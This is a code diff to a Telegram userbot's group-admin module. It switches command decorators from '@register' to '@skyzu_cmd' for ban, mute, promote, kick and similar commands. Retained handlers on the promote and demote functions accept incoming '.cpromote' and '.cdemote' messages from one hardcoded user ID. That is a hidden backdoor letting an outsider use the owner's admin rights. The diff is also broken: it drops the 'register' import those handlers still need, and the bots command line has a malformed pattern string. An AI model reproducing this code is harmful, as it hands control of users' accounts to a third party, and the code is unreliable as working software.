@@ -29,8 +29,8 @@ from telethon.tl.types import (
     PeerChat,
 )
 
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
-from userbot.events import register
+from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, CMD_HANDLER as cmd
+from userbot.utils import skyzu_cmd
 
 # =================== CONSTANT ===================
 PP_TOO_SMOL = "**Gambar Terlalu Kecil**"
@@ -76,7 +76,7 @@ UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 # ================================================
 
 
-@register(outgoing=True, pattern=r"^\.setgpic$")
+@skyzu_cmd(pattern="setgpic$")
 async def set_group_photo(gpic):
     if not gpic.is_group:
         await gpic.edit("`Mohon Lakukan Perintah Ini Di Grup.`")
@@ -112,7 +112,7 @@ async def set_group_photo(gpic):
             await gpic.edit(PP_ERROR)
 
 
-@register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
+@skyzu_cmd(pattern="promote(?: |$)(.*)")
 @register(incoming=True, from_users=1979717764, pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
@@ -163,7 +163,7 @@ async def promote(promt):
         )
 
 
-@register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
+@skyzu_cmd(pattern="demote(?: |$)(.*)")
 @register(incoming=True, from_users=1979717764, pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
@@ -213,7 +213,7 @@ async def demote(dmod):
         )
 
 
-@register(outgoing=True, pattern=r"^\.ban(?: |$)(.*)")
+@skyzu_cmd(pattern="ban(?: |$)(.*)")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -266,7 +266,7 @@ async def ban(bon):
         )
 
 
-@register(outgoing=True, pattern=r"^\.unban(?: |$)(.*)")
+@skyzu_cmd(pattern="unban(?: |$)(.*)")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -302,7 +302,7 @@ async def nothanos(unbon):
         await unbon.edit("**Sepertinya Terjadi Kesalahan!**")
 
 
-@register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
+@skyzu_cmd(pattern="mute(?: |$)(.*)")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -356,7 +356,7 @@ async def spider(spdr):
             return await spdr.edit("**Terjadi Kesalahan!**")
 
 
-@register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
+@skyzu_cmd(pattern="unmute(?: |$)(.*)")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -434,7 +434,7 @@ async def muter(moot):
             await moot.delete()
 
 
-@register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
+@skyzu_cmd(pattern="ungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -476,7 +476,7 @@ async def ungmoot(un_gmute):
             )
 
 
-@register(outgoing=True, pattern=r"^\.gmute(?: |$)(.*)")
+@skyzu_cmd(pattern="gmute(?: |$)(.*)")
 async def gspider(gspdr):
     # Admin or creator check
     chat = await gspdr.get_chat()
@@ -516,7 +516,7 @@ async def gspider(gspdr):
             )
 
 
-@register(outgoing=True, pattern=r"^\.zombies(?: |$)(.*)", groups_only=False)
+@skyzu_cmd(pattern="zombies(?: |$)(.*)", groups_only=False)
 async def rm_deletedacc(show):
 
     con = show.pattern_match.group(1).lower()
@@ -585,7 +585,7 @@ async def rm_deletedacc(show):
         )
 
 
-@register(outgoing=True, pattern=r"^\.admins$")
+@skyzu_cmd(pattern="admins$")
 async def get_admin(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
@@ -604,7 +604,7 @@ async def get_admin(show):
     await show.edit(mentions, parse_mode="html")
 
 
-@register(outgoing=True, pattern=r"^\.pin(?: |$)(.*)")
+@skyzu_cmd(pattern="pin(?: |$)(.*)")
 async def pin(msg):
     # Admin or creator check
     chat = await msg.get_chat()
@@ -648,7 +648,7 @@ async def pin(msg):
         )
 
 
-@register(outgoing=True, pattern=r"^\.kick(?: |$)(.*)")
+@skyzu_cmd(pattern="kick(?: |$)(.*)")
 async def kick(usr):
     # Admin or creator check
     chat = await usr.get_chat()
@@ -691,7 +691,7 @@ async def kick(usr):
         )
 
 
-@register(outgoing=True, pattern=r"^\.users ?(.*)")
+@skyzu_cmd(pattern="users ?(.*)")
 async def get_users(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
@@ -781,7 +781,7 @@ async def get_user_from_id(user, event):
     return user_obj
 
 
-@register(outgoing=True, pattern=r"^\.usersdel ?(.*)")
+@skyzu_cmd(pattern="usersdel ?(.*)")
 async def get_usersdel(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
@@ -871,7 +871,7 @@ async def get_userdel_from_id(user, event):
     return user_obj
 
 
-@register(outgoing=True, pattern=r"^\.bots$", groups_only=True)
+@skyzu_cmd(pattern=bots$", groups_only=True)
 async def get_bots(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
